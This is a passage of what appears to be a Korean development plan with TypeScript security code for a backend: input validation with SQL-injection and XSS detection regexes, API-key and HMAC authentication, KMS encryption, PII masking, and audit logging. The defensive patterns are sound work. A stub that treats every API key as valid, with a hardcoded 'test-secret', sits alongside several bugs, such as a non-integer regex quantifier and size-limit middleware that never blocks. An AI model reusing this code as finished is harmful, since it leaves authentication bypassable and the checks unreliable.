## Task 0.10: 보안 강화 설정

### SubTask 0.10.1: 입력 검증 및 살균 시스템
**목표**: 모든 사용자 입력에 대한 철저한 검증

**구현 내용**:
```typescript
// backend/src/security/input-validation.ts
import Joi from 'joi';
import DOMPurify from 'isomorphic-dompurify';
import { Request, Response, NextFunction } from 'express';

// 커스텀 Joi 확장
const customJoi = Joi.extend((joi) => ({
  type: 'string',
  base: joi.string(),
  messages: {
    'string.noSQL': '{{#label}} contains potential SQL injection',
    'string.noXSS': '{{#label}} contains potential XSS attack'
  },
  rules: {
    noSQL: {
      validate(value, helpers) {
        const sqlPatterns = [
          /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE)\b)/i,
          /(--|\/\*|\*\/|xp_|sp_)/i,
          /(\bOR\b\s*\d+\s*=\s*\d+)/i,
          /(\bAND\b\s*\d+\s*=\s*\d+)/i
        ];
        
        for (const pattern of sqlPatterns) {
          if (pattern.test(value)) {
            return helpers.error('string.noSQL');
          }
        }
        return value;
      }
    },
    noXSS: {
      validate(value, helpers) {
        const xssPatterns = [
          /<script[^>]*>.*?<\/script>/gi,
          /<iframe[^>]*>.*?<\/iframe>/gi,
          /javascript:/gi,
          /on\w+\s*=/gi
        ];
        
        for (const pattern of xssPatterns) {
          if (pattern.test(value)) {
            return helpers.error('string.noXSS');
          }
        }
        return value;
      }
    }
  }
}));

// 검증 스키마 정의
export const validationSchemas = {
  // 프로젝트 생성
  createProject: customJoi.object({
    name: customJoi.string()
      .min(3)
      .max(100)
      .pattern(/^[a-zA-Z0-9-_\s]+$/)
      .noSQL()
      .noXSS()
      .required()
      .messages({
        'string.pattern.base': 'Project name can only contain letters, numbers, spaces, hyphens, and underscores'
      }),
    
    description: customJoi.string()
      .min(10)
      .max(5000)
      .noSQL()
      .noXSS()
      .required(),
    
    projectType: customJoi.string()
      .valid('web', 'api', 'mobile', 'desktop', 'cli')
      .required(),
    
    targetPlatforms: customJoi.array()
      .items(customJoi.string().valid('web', 'ios', 'android', 'windows', 'macos', 'linux'))
      .min(1)
      .max(6)
      .unique(),
    
    preferences: customJoi.object({
      framework: customJoi.string().valid('react', 'vue', 'angular', 'svelte', 'nextjs', 'nuxt'),
      language: customJoi.string().valid('javascript', 'typescript', 'python', 'java', 'go'),
      database: customJoi.string().valid('postgres', 'mysql', 'mongodb', 'dynamodb', 'redis')
    })
  }),
  
  // 사용자 등록
  registerUser: customJoi.object({
    email: customJoi.string()
      .email({ tlds: { allow: false } })
      .max(255)
      .noSQL()
      .required(),
    
    password: customJoi.string()
      .min(8)
      .max(128)
      .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/)
      .required()
      .messages({
        'string.pattern.base': 'Password must contain at least one uppercase letter, one lowercase letter, one number, and one special character'
      }),
    
    name: customJoi.string()
      .min(2)
      .max(100)
      .pattern(/^[a-zA-Z\s'-]+$/)
      .noSQL()
      .noXSS()
      .required()
  }),
  
  // 에이전트 실행 파라미터
  executeAgent: customJoi.object({
    agentName: customJoi.string()
      .valid(...['nl-input', 'ui-selection', 'parsing', 'component-decision', 'matching-rate', 'search', 'generation', 'assembly', 'download'])
      .required(),
    
    parameters: customJoi.object().pattern(
      customJoi.string(),
      customJoi.alternatives().try(
        customJoi.string().max(1000).noSQL().noXSS(),
        customJoi.number(),
        customJoi.boolean(),
        customJoi.array().max(100)
      )
    )
  })
};

// HTML 살균 옵션
const sanitizeOptions = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'target', 'rel'],
  ALLOW_DATA_ATTR: false,
  RETURN_DOM: false,
  RETURN_DOM_FRAGMENT: false
};

// 입력 살균 함수
export function sanitizeInput(input: any): any {
  if (typeof input === 'string') {
    // HTML 태그 제거 및 살균
    return DOMPurify.sanitize(input, sanitizeOptions);
  } else if (Array.isArray(input)) {
    return input.map(item => sanitizeInput(item));
  } else if (input !== null && typeof input === 'object') {
    const sanitized: any = {};
    for (const key in input) {
      if (input.hasOwnProperty(key)) {
        sanitized[key] = sanitizeInput(input[key]);
      }
    }
    return sanitized;
  }
  return input;
}

// 검증 미들웨어 팩토리
export function validate(schema: Joi.ObjectSchema) {
  return async (req: Request, res: Response, next: NextFunction) => {
    try {
      // 요청 본문 살균
      req.body = sanitizeInput(req.body);
      
      // Joi 검증
      const validated = await schema.validateAsync(req.body, {
        abortEarly: false,
        stripUnknown: true
      });
      
      // 검증된 데이터로 교체
      req.body = validated;
      
      next();
    } catch (error) {
      if (error instanceof Joi.ValidationError) {
        const errors = error.details.map(detail => ({
          field: detail.path.join('.'),
          message: detail.message
        }));
        
        return res.status(400).json({
          error: 'Validation failed',
          details: errors
        });
      }
      
      next(error);
    }
  };
}

// 파일 업로드 검증
export function validateFileUpload(options: {
  maxSize?: number;
  allowedTypes?: string[];
  allowedExtensions?: string[];
}) {
  const {
    maxSize = 10 * 1024 * 1024, // 10MB
    allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'],
    allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf']
  } = options;
  
  return (req: Request, res: Response, next: NextFunction) => {
    if (!req.file) {
      return next();
    }
    
    // 파일 크기 검증
    if (req.file.size > maxSize) {
      return res.status(400).json({
        error: 'File too large',
        maxSize: `${maxSize / 1024 / 1024}MB`
      });
    }
    
    // MIME 타입 검증
    if (!allowedTypes.includes(req.file.mimetype)) {
      return res.status(400).json({
        error: 'Invalid file type',
        allowedTypes
      });
    }
    
    // 확장자 검증
    const extension = path.extname(req.file.originalname).toLowerCase();
    if (!allowedExtensions.includes(extension)) {
      return res.status(400).json({
        error: 'Invalid file extension',
        allowedExtensions
      });
    }
    
    // 파일 내용 검증 (Magic Number)
    const magicNumbers: Record<string, string[]> = {
      'image/jpeg': ['FFD8FF'],
      'image/png': ['89504E47'],
      'image/gif': ['47494638'],
      'application/pdf': ['25504446']
    };
    
    const buffer = req.file.buffer;
    const magic = buffer.toString('hex', 0, 4).toUpperCase();
    const expectedMagic = magicNumbers[req.file.mimetype];
    
    if (expectedMagic && !expectedMagic.some(m => magic.startsWith(m))) {
      return res.status(400).json({
        error: 'File content does not match declared type'
      });
    }
    
    next();
  };
}

// SQL Injection 방지를 위한 파라미터화된 쿼리 헬퍼
export class SafeQueryBuilder {
  private params: any[] = [];
  private query: string = '';
  
  select(table: string, columns: string[] = ['*']): this {
    const safeTable = table.replace(/[^a-zA-Z0-9_]/g, '');
    const safeColumns = columns.map(col => col.replace(/[^a-zA-Z0-9_*]/g, ''));
    this.query = `SELECT ${safeColumns.join(', ')} FROM ${safeTable}`;
    return this;
  }
  
  where(column: string, operator: string, value: any): this {
    const safeColumn = column.replace(/[^a-zA-Z0-9_]/g, '');
    const safeOperator = ['=', '!=', '<', '>', '<=', '>=', 'LIKE'].includes(operator) ? operator : '=';
    
    if (this.query.includes('WHERE')) {
      this.query += ` AND ${safeColumn} ${safeOperator} ?`;
    } else {
      this.query += ` WHERE ${safeColumn} ${safeOperator} ?`;
    }
    
    this.params.push(value);
    return this;
  }
  
  build(): { query: string; params: any[] } {
    return {
      query: this.query,
      params: this.params
    };
  }
}
```
---

### SubTask 0.10.2: API 보안 강화
**목표**: API 엔드포인트 보안 계층 구현

**구현 내용**:
```typescript
// backend/src/security/api-security.ts
import crypto from 'crypto';
import { Request, Response, NextFunction } from 'express';
import { RateLimiter } from '../middleware/rate-limiter';
import jwt from 'jsonwebtoken';

// API 키 관리
export class APIKeyManager {
  private static readonly KEY_PREFIX = 'sk_';
  private static readonly KEY_LENGTH = 32;
  
  static generateAPIKey(): string {
    const randomBytes = crypto.randomBytes(this.KEY_LENGTH);
    const key = randomBytes.toString('base64url');
    return `${this.KEY_PREFIX}${key}`;
  }
  
  static hashAPIKey(apiKey: string): string {
    return crypto
      .createHash('sha256')
      .update(apiKey)
      .digest('hex');
  }
  
  static validateKeyFormat(apiKey: string): boolean {
    const regex = new RegExp(`^${this.KEY_PREFIX}[A-Za-z0-9_-]{${this.KEY_LENGTH * 4/3}}$`);
    return regex.test(apiKey);
  }
}

// HMAC 서명 검증
export class HMACValidator {
  private static readonly ALGORITHM = 'sha256';
  private static readonly TIMESTAMP_TOLERANCE = 300; // 5분
  
  static generateSignature(
    secret: string,
    method: string,
    path: string,
    timestamp: number,
    body?: any
  ): string {
    const payload = [
      method.toUpperCase(),
      path,
      timestamp,
      body ? JSON.stringify(body) : ''
    ].join('\n');
    
    return crypto
      .createHmac(this.ALGORITHM, secret)
      .update(payload)
      .digest('hex');
  }
  
  static validateRequest(req: Request, secret: string): boolean {
    const signature = req.headers['x-signature'] as string;
    const timestamp = parseInt(req.headers['x-timestamp'] as string);
    
    if (!signature || !timestamp) {
      return false;
    }
    
    // 타임스탬프 유효성 검사
    const now = Math.floor(Date.now() / 1000);
    if (Math.abs(now - timestamp) > this.TIMESTAMP_TOLERANCE) {
      return false;
    }
    
    // 서명 생성 및 비교
    const expectedSignature = this.generateSignature(
      secret,
      req.method,
      req.path,
      timestamp,
      req.body
    );
    
    // 타이밍 공격 방지를 위한 안전한 비교
    return crypto.timingSafeEqual(
      Buffer.from(signature),
      Buffer.from(expectedSignature)
    );
  }
}

// OAuth2 스코프 관리
export class ScopeManager {
  static readonly SCOPES = {
    'projects:read': 'Read project information',
    'projects:write': 'Create and modify projects',
    'projects:delete': 'Delete projects',
    'agents:execute': 'Execute agents',
    'agents:monitor': 'Monitor agent execution',
    'components:read': 'Read component library',
    'components:write': 'Add components to library',
    'billing:read': 'View billing information',
    'billing:write': 'Modify billing settings',
    'admin:all': 'Full administrative access'
  };
  
  static validateScopes(requiredScopes: string[], userScopes: string[]): boolean {
    // admin:all 스코프는 모든 권한 포함
    if (userScopes.includes('admin:all')) {
      return true;
    }
    
    return requiredScopes.every(scope => userScopes.includes(scope));
  }
  
  static parseScopes(scopeString: string): string[] {
    return scopeString.split(' ').filter(scope => scope in this.SCOPES);
  }
}

// API 보안 미들웨어
export class APISecurityMiddleware {
  // API 키 인증
  static apiKeyAuth(requiredScopes: string[] = []) {
    return async (req: Request, res: Response, next: NextFunction) => {
      const apiKey = req.headers['x-api-key'] as string;
      
      if (!apiKey) {
        return res.status(401).json({
          error: 'API key required',
          code: 'MISSING_API_KEY'
        });
      }
      
      if (!APIKeyManager.validateKeyFormat(apiKey)) {
        return res.status(401).json({
          error: 'Invalid API key format',
          code: 'INVALID_API_KEY_FORMAT'
        });
      }
      
      try {
        // DB에서 API 키 정보 조회
        const hashedKey = APIKeyManager.hashAPIKey(apiKey);
        const keyInfo = await this.getAPIKeyInfo(hashedKey);
        
        if (!keyInfo || !keyInfo.active) {
          return res.status(401).json({
            error: 'Invalid or inactive API key',
            code: 'INVALID_API_KEY'
          });
        }
        
        // 스코프 검증
        if (requiredScopes.length > 0) {
          const hasRequiredScopes = ScopeManager.validateScopes(
            requiredScopes,
            keyInfo.scopes
          );
          
          if (!hasRequiredScopes) {
            return res.status(403).json({
              error: 'Insufficient permissions',
              code: 'INSUFFICIENT_SCOPES',
              required: requiredScopes,
              provided: keyInfo.scopes
            });
          }
        }
        
        // 요청에 사용자 정보 추가
        req.user = {
          id: keyInfo.userId,
          scopes: keyInfo.scopes,
          authMethod: 'api_key'
        };
        
        // 사용량 기록
        await this.recordAPIKeyUsage(hashedKey, req.path);
        
        next();
      } catch (error) {
        console.error('API key validation error:', error);
        return res.status(500).json({
          error: 'Authentication error',
          code: 'AUTH_ERROR'
        });
      }
    };
  }
  
  // HMAC 서명 검증
  static hmacAuth() {
    return async (req: Request, res: Response, next: NextFunction) => {
      const apiKey = req.headers['x-api-key'] as string;
      
      if (!apiKey) {
        return res.status(401).json({
          error: 'API key required for HMAC authentication',
          code: 'MISSING_API_KEY'
        });
      }
      
      try {
        // API 키에서 시크릿 조회
        const hashedKey = APIKeyManager.hashAPIKey(apiKey);
        const keyInfo = await this.getAPIKeyInfo(hashedKey);
        
        if (!keyInfo || !keyInfo.secret) {
          return res.status(401).json({
            error: 'Invalid API key',
            code: 'INVALID_API_KEY'
          });
        }
        
        // HMAC 검증
        const isValid = HMACValidator.validateRequest(req, keyInfo.secret);
        
        if (!isValid) {
          return res.status(401).json({
            error: 'Invalid signature',
            code: 'INVALID_SIGNATURE'
          });
        }
        
        req.user = {
          id: keyInfo.userId,
          scopes: keyInfo.scopes,
          authMethod: 'hmac'
        };
        
        next();
      } catch (error) {
        console.error('HMAC validation error:', error);
        return res.status(500).json({
          error: 'Authentication error',
          code: 'AUTH_ERROR'
        });
      }
    };
  }
  
  // IP 화이트리스트
  static ipWhitelist(allowedIPs: string[] = []) {
    return (req: Request, res: Response, next: NextFunction) => {
      // 개발 환경에서는 건너뛰기
      if (process.env.NODE_ENV === 'development') {
        return next();
      }
      
      const clientIP = req.ip || req.socket.remoteAddress || '';
      
      // IPv6 localhost를 IPv4로 변환
      const normalizedIP = clientIP === '::1' ? '127.0.0.1' : clientIP;
      
      if (!allowedIPs.includes(normalizedIP)) {
        return res.status(403).json({
          error: 'Access denied from this IP address',
          code: 'IP_NOT_ALLOWED'
        });
      }
      
      next();
    };
  }
  
  // 요청 크기 제한
  static requestSizeLimit(maxSizeBytes: number = 10 * 1024 * 1024) {
    return (req: Request, res: Response, next: NextFunction) => {
      let size = 0;
      
      req.on('data', (chunk) => {
        size += chunk.length;
        
        if (size > maxSizeBytes) {
          res.status(413).json({
            error: 'Request entity too large',
            code: 'PAYLOAD_TOO_LARGE',
            maxSize: maxSizeBytes
          });
          req.destroy();
        }
      });
      
      next();
    };
  }
  
  // 보안 헤더 설정
  static securityHeaders() {
    return (req: Request, res: Response, next: NextFunction) => {
      // CORS 프리플라이트 요청 처리
      if (req.method === 'OPTIONS') {
        res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH');
        res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-API-Key, X-Signature, X-Timestamp');
        res.header('Access-Control-Max-Age', '86400');
        return res.sendStatus(204);
      }
      
      // 보안 헤더 설정
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.setHeader('X-Frame-Options', 'DENY');
      res.setHeader('X-XSS-Protection', '1; mode=block');
      res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
      res.setHeader('Content-Security-Policy', "default-src 'self'");
      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
      res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
      
      // API 버전 헤더
      res.setHeader('X-API-Version', process.env.API_VERSION || '1.0.0');
      
      next();
    };
  }
  
  // Helper 메서드들
  private static async getAPIKeyInfo(hashedKey: string): Promise<any> {
    // 실제 구현에서는 DynamoDB에서 조회
    // 임시 구현
    return {
      userId: 'user123',
      scopes: ['projects:read', 'projects:write'],
      active: true,
      secret: 'test-secret'
    };
  }
  
  private static async recordAPIKeyUsage(hashedKey: string, endpoint: string): Promise<void> {
    // 실제 구현에서는 사용량 기록
    // CloudWatch 메트릭 기록 등
  }
}

// 동적 Rate Limiting
export class DynamicRateLimiter {
  private static limits: Map<string, number> = new Map([
    ['free', 100],      // 100 requests per hour
    ['basic', 1000],    // 1000 requests per hour
    ['pro', 10000],     // 10000 requests per hour
    ['enterprise', -1]  // Unlimited
  ]);
  
  static middleware() {
    return async (req: Request, res: Response, next: NextFunction) => {
      if (!req.user) {
        return next();
      }
      
      // 사용자 플랜 조회
      const userPlan = await this.getUserPlan(req.user.id);
      const limit = this.limits.get(userPlan) || 100;
      
      // 무제한 플랜
      if (limit === -1) {
        return next();
      }
      
      // Rate limiting 적용
      const rateLimiter = new RateLimiter();
      const limitMiddleware = rateLimiter.middleware({
        windowMs: 60 * 60 * 1000, // 1시간
        max: limit,
        keyGenerator: (req) => req.user!.id,
        message: `Rate limit exceeded. Your plan allows ${limit} requests per hour.`
      });
      
      limitMiddleware(req, res, next);
    };
  }
  
  private static async getUserPlan(userId: string): Promise<string> {
    // 실제 구현에서는 DB에서 조회
    return 'basic';
  }
}
```

### SubTask 0.10.3: 데이터 암호화 및 보호
**목표**: 저장 및 전송 중인 데이터 암호화

**구현 내용**:
```typescript
// backend/src/security/encryption.ts
import crypto from 'crypto';
import { KMSClient, EncryptCommand, DecryptCommand, GenerateDataKeyCommand } from '@aws-sdk/client-kms';

// 암호화 설정
const ENCRYPTION_ALGORITHM = 'aes-256-gcm';
const IV_LENGTH = 16;
const TAG_LENGTH = 16;
const SALT_LENGTH = 32;
const KEY_LENGTH = 32;
const ITERATIONS = 100000;

export class EncryptionService {
  private kmsClient: KMSClient;
  private masterKeyId: string;
  
  constructor() {
    this.kmsClient = new KMSClient({ region: process.env.AWS_REGION });
    this.masterKeyId = process.env.KMS_MASTER_KEY_ID!;
  }
  
  // 필드 레벨 암호화
  async encryptField(plaintext: string, context?: Record<string, string>): Promise<string> {
    // KMS로 데이터 키 생성
    const dataKeyResponse = await this.kmsClient.send(new GenerateDataKeyCommand({
      KeyId: this.masterKeyId,
      KeySpec: 'AES_256',
      EncryptionContext: context
    }));
    
    const plaintextKey = dataKeyResponse.Plaintext!;
    const encryptedKey = dataKeyResponse.CiphertextBlob!;
    
    // AES-GCM으로 데이터 암호화
    const iv = crypto.randomBytes(IV_LENGTH);
    const cipher = crypto.createCipheriv(ENCRYPTION_ALGORITHM, plaintextKey, iv);
    
    const encrypted = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final()
    ]);
    
    const tag = cipher.getAuthTag();
    
    // 암호화된 키 + IV + 태그 + 암호문을 하나로 결합
    const combined = Buffer.concat([
      Buffer.from([encryptedKey.length >> 8, encryptedKey.length & 0xff]),
      encryptedKey,
      iv,
      tag,
      encrypted
    ]);
    
    // 메모리 정리
    crypto.randomFillSync(plaintextKey);
    
    return combined.toString('base64');
  }
  
  // 필드 복호화
  async decryptField(encryptedData: string, context?: Record<string, string>): Promise<string> {
    const combined = Buffer.from(encryptedData, 'base64');
    
    // 구성 요소 분리
    const keyLength = (combined[0] << 8) | combined[1];
    const encryptedKey = combined.slice(2, 2 + keyLength);
    const iv = combined.slice(2 + keyLength, 2 + keyLength + IV_LENGTH);
    const tag = combined.slice(2 + keyLength + IV_LENGTH, 2 + keyLength + IV_LENGTH + TAG_LENGTH);
    const encrypted = combined.slice(2 + keyLength + IV_LENGTH + TAG_LENGTH);
    
    // KMS로 데이터 키 복호화
    const decryptResponse = await this.kmsClient.send(new DecryptCommand({
      CiphertextBlob: encryptedKey,
      EncryptionContext: context
    }));
    
    const plaintextKey = decryptResponse.Plaintext!;
    
    // AES-GCM으로 데이터 복호화
    const decipher = crypto.createDecipheriv(ENCRYPTION_ALGORITHM, plaintextKey, iv);
    decipher.setAuthTag(tag);
    
    const decrypted = Buffer.concat([
      decipher.update(encrypted),
      decipher.final()
    ]);
    
    // 메모리 정리
    crypto.randomFillSync(plaintextKey);
    
    return decrypted.toString('utf8');
  }
  
  // 대칭 암호화 (로컬 키 사용)
  encryptSymmetric(plaintext: string, password: string): string {
    const salt = crypto.randomBytes(SALT_LENGTH);
    const key = crypto.pbkdf2Sync(password, salt, ITERATIONS, KEY_LENGTH, 'sha256');
    const iv = crypto.randomBytes(IV_LENGTH);
    
    const cipher = crypto.createCipheriv(ENCRYPTION_ALGORITHM, key, iv);
    const encrypted = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final()
    ]);
    
    const tag = cipher.getAuthTag();
    
    // salt + iv + tag + encrypted
    const combined = Buffer.concat([salt, iv, tag, encrypted]);
    
    return combined.toString('base64');
  }
  
  // 대칭 복호화
  decryptSymmetric(encryptedData: string, password: string): string {
    const combined = Buffer.from(encryptedData, 'base64');
    
    const salt = combined.slice(0, SALT_LENGTH);
    const iv = combined.slice(SALT_LENGTH, SALT_LENGTH + IV_LENGTH);
    const tag = combined.slice(SALT_LENGTH + IV_LENGTH, SALT_LENGTH + IV_LENGTH + TAG_LENGTH);
    const encrypted = combined.slice(SALT_LENGTH + IV_LENGTH + TAG_LENGTH);
    
    const key = crypto.pbkdf2Sync(password, salt, ITERATIONS, KEY_LENGTH, 'sha256');
    
    const decipher = crypto.createDecipheriv(ENCRYPTION_ALGORITHM, key, iv);
    decipher.setAuthTag(tag);
    
    const decrypted = Buffer.concat([
      decipher.update(encrypted),
      decipher.final()
    ]);
    
    return decrypted.toString('utf8');
  }
  
  // 해시 생성 (비가역)
  hash(data: string): string {
    return crypto
      .createHash('sha256')
      .update(data)
      .digest('hex');
  }
  
  // 안전한 토큰 생성
  generateSecureToken(length: number = 32): string {
    return crypto.randomBytes(length).toString('base64url');
  }
}

// PII 데이터 마스킹
export class DataMasking {
  // 이메일 마스킹
  static maskEmail(email: string): string {
    const [local, domain] = email.split('@');
    if (!domain) return '***';
    
    const maskedLocal = local.length > 2 
      ? local[0] + '*'.repeat(local.length - 2) + local[local.length - 1]
      : '*'.repeat(local.length);
    
    return `${maskedLocal}@${domain}`;
  }
  
  // 전화번호 마스킹
  static maskPhone(phone: string): string {
    const digits = phone.replace(/\D/g, '');
    if (digits.length < 4) return '*'.repeat(digits.length);
    
    return digits.slice(0, -4).replace(/./g, '*') + digits.slice(-4);
  }
  
  // 신용카드 마스킹
  static maskCreditCard(cardNumber: string): string {
    const digits = cardNumber.replace(/\D/g, '');
    if (digits.length < 4) return '*'.repeat(digits.length);
    
    return '*'.repeat(digits.length - 4) + digits.slice(-4);
  }
  
  // 주민번호/SSN 마스킹
  static maskSSN(ssn: string): string {
    const digits = ssn.replace(/\D/g, '');
    if (digits.length < 4) return '*'.repeat(digits.length);
    
    return '*'.repeat(digits.length - 4) + digits.slice(-4);
  }
  
  // JSON 객체 내 민감 필드 마스킹
  static maskObject(obj: any, sensitiveFields: string[]): any {
    const masked = JSON.parse(JSON.stringify(obj));
    
    const maskField = (target: any, path: string) => {
      const keys = path.split('.');
      let current = target;
      
      for (let i = 0; i < keys.length - 1; i++) {
        if (current[keys[i]] === undefined) return;
        current = current[keys[i]];
      }
      
      const lastKey = keys[keys.length - 1];
      if (current[lastKey] !== undefined) {
        if (typeof current[lastKey] === 'string') {
          // 필드 타입에 따른 마스킹
          if (lastKey.toLowerCase().includes('email')) {
            current[lastKey] = this.maskEmail(current[lastKey]);
          } else if (lastKey.toLowerCase().includes('phone')) {
            current[lastKey] = this.maskPhone(current[lastKey]);
          } else if (lastKey.toLowerCase().includes('card')) {
            current[lastKey] = this.maskCreditCard(current[lastKey]);
          } else if (lastKey.toLowerCase().includes('ssn')) {
            current[lastKey] = this.maskSSN(current[lastKey]);
          } else {
            // 일반 텍스트 마스킹
            current[lastKey] = '*'.repeat(current[lastKey].length);
          }
        }
      }
    };
    
    sensitiveFields.forEach(field => maskField(masked, field));
    
    return masked;
  }
}

// 암호화 미들웨어
export class EncryptionMiddleware {
  private static encryptionService = new EncryptionService();
  
  // 응답 데이터 암호화
  static encryptResponse(fieldsToEncrypt: string[]) {
    return async (req: Request, res: Response, next: NextFunction) => {
      const originalJson = res.json;
      
      res.json = async function(data: any) {
        if (fieldsToEncrypt.length > 0 && data) {
          const encrypted = await EncryptionMiddleware.encryptFields(
            data,
            fieldsToEncrypt,
            { userId: req.user?.id }
          );
          return originalJson.call(this, encrypted);
        }
        return originalJson.call(this, data);
      };
      
      next();
    };
  }
  
  // 요청 데이터 복호화
  static decryptRequest(fieldsToDecrypt: string[]) {
    return async (req: Request, res: Response, next: NextFunction) => {
      if (fieldsToDecrypt.length > 0 && req.body) {
        try {
          req.body = await EncryptionMiddleware.decryptFields(
            req.body,
            fieldsToDecrypt,
            { userId: req.user?.id }
          );
        } catch (error) {
          return res.status(400).json({
            error: 'Failed to decrypt request data',
            code: 'DECRYPTION_ERROR'
          });
        }
      }
      next();
    };
  }
  
  private static async encryptFields(
    data: any,
    fields: string[],
    context?: Record<string, string>
  ): Promise<any> {
    const result = JSON.parse(JSON.stringify(data));
    
    for (const field of fields) {
      const value = this.getFieldValue(result, field);
      if (value && typeof value === 'string') {
        const encrypted = await this.encryptionService.encryptField(value, context);
        this.setFieldValue(result, field, encrypted);
      }
    }
    
    return result;
  }
  
  private static async decryptFields(
    data: any,
    fields: string[],
    context?: Record<string, string>
  ): Promise<any> {
    const result = JSON.parse(JSON.stringify(data));
    
    for (const field of fields) {
      const value = this.getFieldValue(result, field);
      if (value && typeof value === 'string') {
        const decrypted = await this.encryptionService.decryptField(value, context);
        this.setFieldValue(result, field, decrypted);
      }
    }
    
    return result;
  }
  
  private static getFieldValue(obj: any, path: string): any {
    const keys = path.split('.');
    let current = obj;
    
    for (const key of keys) {
      if (current[key] === undefined) return undefined;
      current = current[key];
    }
    
    return current;
  }
  
  private static setFieldValue(obj: any, path: string, value: any): void {
    const keys = path.split('.');
    let current = obj;
    
    for (let i = 0; i < keys.length - 1; i++) {
      if (current[keys[i]] === undefined) {
        current[keys[i]] = {};
      }
      current = current[keys[i]];
    }
    
    current[keys[keys.length - 1]] = value;
  }
}
```

### SubTask 0.10.4: 보안 감사 로깅
**목표**: 모든 보안 이벤트 추적 및 감사

**구현 내용**:
```typescript
// backend/src/security/audit-logging.ts
import { CloudWatchLogsClient, PutLogEventsCommand } from '@aws-sdk/client-cloudwatch-logs';
import { DynamoDBDocumentClient, PutCommand } from '@aws-sdk/lib-dynamodb';
import crypto from 'crypto';

interface SecurityEvent {
  id: string;
  timestamp: Date;
  eventType: SecurityEventType;
  severity: 'low' | 'medium' | 'high' | 'critical';
  userId?: string;
  ipAddress?: string;
  userAgent?: string;
  resource?: string;
  action?: string;
  result: 'success' | 'failure';
  details?: Record<string, any>;
  stackTrace?: string;
}

enum SecurityEventType {
  // 인증 관련
  LOGIN_ATTEMPT = 'LOGIN_ATTEMPT',
  LOGIN_SUCCESS = 'LOGIN_SUCCESS',
  LOGIN_FAILURE = 'LOGIN_FAILURE',
  LOGOUT = 'LOGOUT',
  PASSWORD_CHANGE = 'PASSWORD_CHANGE',
  PASSWORD_RESET = 'PASSWORD_RESET',
  MFA_ENABLED = 'MFA_ENABLED',
  MFA_DISABLED = 'MFA_DISABLED',
  
  // 권한 관련
  UNAUTHORIZED_ACCESS = 'UNAUTHORIZED_ACCESS',
  PERMISSION_DENIED = 'PERMISSION_DENIED',
  PRIVILEGE_ESCALATION = 'PRIVILEGE_ESCALATION',
  
  // API 키 관련
  API_KEY_CREATED = 'API_KEY_CREATED',
  API_KEY_REVOKED = 'API_KEY_REVOKED',
  API_KEY_ROTATION = 'API_KEY_ROTATION',
  INVALID_API_KEY = 'INVALID_API_KEY',
  
  // 데이터 접근
  SENSITIVE_DATA_ACCESS = 'SENSITIVE_DATA_ACCESS',
  DATA_EXPORT = 'DATA_EXPORT',
  DATA_DELETION = 'DATA_DELETION',
  
  // 보안 위협
  SQL_INJECTION_ATTEMPT = 'SQL_INJECTION_ATTEMPT',
  XSS_ATTEMPT = 'XSS_ATTEMPT',
  RATE_LIMIT_EXCEEDED = 'RATE_LIMIT_EXCEEDED',
  SUSPICIOUS_ACTIVITY = 'SUSPICIOUS_ACTIVITY',
  BRUTE_FORCE_ATTEMPT = 'BRUTE_FORCE_ATTEMPT',
  
  // 시스템 보안
  SECURITY_CONFIGURATION_CHANGE = 'SECURITY_CONFIGURATION_CHANGE',
  CERTIFICATE_EXPIRY_WARNING = 'CERTIFICATE_EXPIRY_WARNING',
  ENCRYPTION_KEY_ROTATION = 'ENCRYPTION_KEY_ROTATION'
}

export class SecurityAuditLogger {
  private cloudWatchClient: CloudWatchLogsClient;
  private dynamoClient: DynamoDBDocumentClient;
  private logGroupName: string;
  private logStreamName: string;
  private tableName: string;
  
  constructor(
    cloudWatchClient: CloudWatchLogsClient,
    dynamoClient: DynamoDBDocumentClient
  ) {
    this.cloudWatchClient = cloudWatchClient;
    this.dynamoClient = dynamoClient;
    this.logGroupName = '/aws/t-developer/security-audit';
    this.logStreamName = `security-${new Date().toISOString().split('T')[0]}`;
    this.tableName = 'T-Developer-SecurityAudit';
  }
  
  async logSecurityEvent(event: Omit<SecurityEvent, 'id' | 'timestamp'>): Promise<void> {
    const securityEvent: SecurityEvent = {
      ...event,
      id: this.generateEventId(),
      timestamp: new Date()
    };
    
    // 병렬로 여러 저장소에 기록
    await Promise.all([
      this.saveToCloudWatch(securityEvent),
      this.saveToDynamoDB(securityEvent),
      this.alertIfCritical(securityEvent)
    ]);
  }
  
  private generateEventId(): string {
    return `sec_${Date.now()}_${crypto.randomBytes(8).toString('hex')}`;
  }
  
  private async saveToCloudWatch(event: SecurityEvent): Promise<void> {
    const logEvent = {
      timestamp: event.timestamp.getTime(),
      message: JSON.stringify({
        ...event,
        timestamp: event.timestamp.toISOString()
      })
    };
    
    try {
      await this.cloudWatchClient.send(new PutLogEventsCommand({
        logGroupName: this.logGroupName,
        logStreamName: this.logStreamName,
        logEvents: [logEvent]
      }));
    } catch (error) {
      console.error('Failed to save security event to CloudWatch:', error);
    }
  }
  
  private async saveToDynamoDB(event: SecurityEvent): Promise<void> {
    const ttl = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60); // 1년 보관
    
    try {
      await this.dynamoClient.send(new PutCommand({
        TableName: this.tableName,
        Item: {
          ...event,
          timestamp: event.timestamp.toISOString(),
          ttl,
          yearMonth: event.timestamp.toISOString().substring(0, 7), // 파티션 키 최적화
          searchableText: this.createSearchableText(event) // 검색 최적화
        }
      }));
    } catch (error) {
      console.error('Failed to save security event to DynamoDB:', error);
    }
  }
  
  private createSearchableText(event: SecurityEvent): string {
    return [
      event.eventType,
      event.userId,
      event.ipAddress,
      event.resource,
      event.action,
      JSON.stringify(event.details)
